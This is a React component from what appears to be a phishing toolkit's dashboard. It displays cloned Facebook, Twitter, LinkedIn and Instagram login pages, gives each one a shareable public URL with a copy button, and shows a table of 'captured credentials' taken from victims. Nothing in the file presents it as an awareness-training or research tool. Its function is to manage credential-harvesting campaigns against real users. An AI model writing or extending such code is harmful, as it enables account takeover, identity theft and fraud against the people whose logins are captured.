'use client';
import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from '@/components/ui/card';
import {
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger,
} from '@/components/ui/accordion';
import { Button } from '@/components/ui/button';
import {
  Facebook,
  Twitter,
  Linkedin,
  Instagram,
  Copy,
  Trash2,
} from 'lucide-react';
import type { Clone } from '@/lib/types';
import { CredentialsTable } from './credentials-table';
import { useToast } from '@/hooks/use-toast';
import { useClones } from '@/hooks/use-clones';
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog"

const platformIcons = {
  facebook: <Facebook className="h-6 w-6 text-blue-600" />,
  twitter: <Twitter className="h-6 w-6 text-sky-500" />,
  linkedin: <Linkedin className="h-6 w-6 text-blue-800" />,
  instagram: <Instagram className="h-6 w-6 text-pink-500" />,
};

const platformNames = {
    facebook: 'Facebook',
    twitter: 'Twitter',
    linkedin: 'LinkedIn',
    instagram: 'Instagram'
}

export function CloneCard({ clone }: { clone: Clone }) {
  const { toast } = useToast();
  const { deleteClone } = useClones();

  const fullUrl = `${window.location.origin}${clone.url}`;

  const copyToClipboard = () => {
    navigator.clipboard.writeText(fullUrl);
    toast({
      title: 'Copied to clipboard!',
      description: 'The public URL has been copied.',
    });
  };
  
  const handleDelete = () => {
    deleteClone(clone.id);
    toast({
      title: 'Clone Deleted',
      description: `The ${platformNames[clone.platform]} clone has been deleted.`,
    });
  };

  return (
    <Card>
      <CardHeader>
        <div className="flex justify-between items-start">
            <div>
                <CardTitle className="flex items-center gap-2 font-headline">
                    {platformIcons[clone.platform]}
                    <span>{platformNames[clone.platform]}</span>
                </CardTitle>
                <CardDescription className="mt-2">
                    Created on {new Date(clone.createdAt).toLocaleDateString()}
                </CardDescription>
            </div>
            <AlertDialog>
              <AlertDialogTrigger asChild>
                <Button variant="ghost" size="icon">
                    <Trash2 className="h-4 w-4 text-destructive" />
                </Button>
              </AlertDialogTrigger>
              <AlertDialogContent>
                <AlertDialogHeader>
                  <AlertDialogTitle>Are you absolutely sure?</AlertDialogTitle>
                  <AlertDialogDescription>
                    This action cannot be undone. This will permanently delete your clone
                    and all captured credentials.
                  </AlertDialogDescription>
                </AlertDialogHeader>
                <AlertDialogFooter>
                  <AlertDialogCancel>Cancel</AlertDialogCancel>
                  <AlertDialogAction onClick={handleDelete} className="bg-destructive hover:bg-destructive/90">Delete</AlertDialogAction>
                </AlertDialogFooter>
              </AlertDialogContent>
            </AlertDialog>
        </div>
      </CardHeader>
      <CardContent>
        <div className="space-y-4">
          <div>
            <label className="text-sm font-medium text-muted-foreground">
              Public URL
            </label>
            <div className="flex items-center gap-2 mt-1">
              <input
                type="text"
                readOnly
                value={fullUrl}
                className="flex h-9 w-full rounded-md border border-input bg-transparent px-3 py-1 text-sm shadow-sm transition-colors file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:cursor-not-allowed disabled:opacity-50 flex-grow"
              />
              <Button variant="outline" size="icon" onClick={copyToClipboard}>
                <Copy className="h-4 w-4" />
              </Button>
            </div>
          </div>
          <Accordion type="single" collapsible>
            <AccordionItem value="item-1">
              <AccordionTrigger>
                View Captured Credentials ({clone.credentials.length})
              </AccordionTrigger>
              <AccordionContent>
                {clone.credentials.length > 0 ? (
                  <CredentialsTable credentials={clone.credentials} />
                ) : (
                  <p className="text-sm text-muted-foreground text-center py-4">
                    No credentials captured yet.
                  </p>
                )}
              </AccordionContent>
            </AccordionItem>
          </Accordion>
        </div>
      </CardContent>
    </Card>
  );
}
